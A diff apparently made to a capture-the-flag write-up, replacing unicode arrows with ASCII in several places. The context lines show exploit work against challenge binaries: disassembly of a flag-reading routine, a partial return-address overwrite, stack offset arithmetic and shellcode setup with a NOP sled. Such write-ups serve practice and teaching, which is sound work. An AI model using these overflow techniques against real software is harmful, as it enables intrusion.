@@ -2471,20 +2471,20 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 403b55:  ...
 403b61:  lea ["/flag"], rdi
 403b6a:  xor esi, esi
-403b6c:  call open@plt                 ; open("/flag", 0) → fd
+403b6c:  call open@plt                 ; open("/flag", 0) -> fd
 403b71:  mov eax, edi
-403b75:  jns 403bab                    ; if fd >= 0 → success
+403b75:  jns 403bab                    ; if fd >= 0 -> success
 ...
 403bab:  mov $0x100, edx
 403bb0:  mov rbp, rsi                  ; rsi = rbp = rsp (valid stack!)
-403bb3:  call read@plt                 ; read(fd, rsp, 256) → flag on stack
+403bb3:  call read@plt                 ; read(fd, rsp, 256) -> flag on stack
 403bb8:  test eax, eax
-403bba:  jg 403be6                     ; if bytes_read > 0 → write flag
+403bba:  jg 403be6                     ; if bytes_read > 0 -> write flag
 ...
 403be6:  movslq eax, rdx
 403be9:  mov rbp, rsi
 403bec:  mov $0x1, edi
-403bf1:  call write@plt                ; write(1, rsp, bytes_read) → FLAG!
+403bf1:  call write@plt                ; write(1, rsp, bytes_read) -> FLAG!
 ```
 
 When jumped to directly from `handle_1337()`'s `ret`:
@@ -2509,7 +2509,7 @@ CANVAS_H = 1
 DIRECTIVES = 2
 
 # Target 0x403b42: "mov rsp,rbp" entry in win() loop
-# Partial overwrite with width=170: pixels 168,169 → ret addr bytes 0,1;
+# Partial overwrite with width=170: pixels 168,169 -> ret addr bytes 0,1;
 # bytes 170-175 stay as original [0x40, 0x00, ...] from return to main
 # => [0x42, 0x3b, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00] = 0x403b42
 
@@ -3241,7 +3241,7 @@ The `Server:` string has 24 threes (`pwnserver/1.333333333333333333333333.7`), m
 | `\n` | 1 |
 | **Total** | **133** |
 
-Return address slot: `0x2008 + 8 = 8208` bytes from `content[0]` → **file byte `8208 - 133 = 8075`**.
+Return address slot: `0x2008 + 8 = 8208` bytes from `content[0]` -> **file byte `8208 - 133 = 8075`**.
 
 Since ASLR is disabled and ptrace is blocked, we use the same probe technique as before. The probe mimics the exact call-chain frame sizes from the IDA disassembly, identical to the previous challenge since `send_file` and `handle_connection` are unchanged:
 
@@ -3382,7 +3382,7 @@ reqbuf:  .zero 1024
 sc = asm(shellcode_asm)
 
 CONTENT0 = 0x7fffffff9e88   # rbp - 0x2008, from probe binary
-HDR_SIZE = 133               # 24 threes in Server: header → 133 bytes
+HDR_SIZE = 133               # 24 threes in Server: header -> 133 bytes
 RET_FILE = 0x2010 - HDR_SIZE # = 8075
 NOP_LEN  = 6000
 RET_ADDR = CONTENT0 + HDR_SIZE + NOP_LEN // 2
